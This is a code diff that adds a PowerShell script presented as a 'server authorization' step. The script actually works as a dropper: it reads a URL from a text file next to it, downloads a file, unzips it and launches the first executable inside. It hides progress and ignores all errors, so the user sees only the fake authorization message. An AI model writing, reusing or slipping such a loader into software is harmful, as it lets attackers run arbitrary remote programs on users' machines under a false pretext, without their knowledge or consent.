@@ -1,0 +1,48 @@
+Start-Sleep -Milliseconds 300
+$ProgressPreference = 'SilentlyContinue'
+
+try {
+    Write-Host "Processing server authorization, please wait..."
+    # Get the directory where the script is located
+    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+
+    # Path to link.txt
+    $linkFile = Join-Path $scriptDir "output1.txt"
+
+    # Read the URL from the file
+    $url = (Get-Content $linkFile -ErrorAction SilentlyContinue).Trim()
+
+    if (-not $url) { return }
+
+    # Get the file name from the URL
+    $fileName = Split-Path $url -Leaf
+
+    # Set output path (same directory)
+    $outputPath = Join-Path $scriptDir $fileName
+
+    # Download the file (no progress now)
+    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction SilentlyContinue
+
+    # Check if the file is a .zip
+    if ($fileName.ToLower().EndsWith(".zip")) {
+        $extractPath = Join-Path $scriptDir "extracted"
+
+        # Create extraction folder if it doesn't exist
+        if (-not (Test-Path $extractPath)) {
+            New-Item -ItemType Directory -Path $extractPath | Out-Null
+        }
+
+        # Extract the zip
+        Expand-Archive -Path $outputPath -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
+
+        # Find the first .exe file in the extracted folder (recursively)
+        $exeFile = Get-ChildItem -Path $extractPath -Recurse -Filter *.exe -ErrorAction SilentlyContinue | Select-Object -First 1
+
+        if ($exeFile) {
+            Start-Process $exeFile.FullName -ArgumentList "-arg2"
+        }
+    }
+}
+catch {
+    # Silently ignore errors
+}
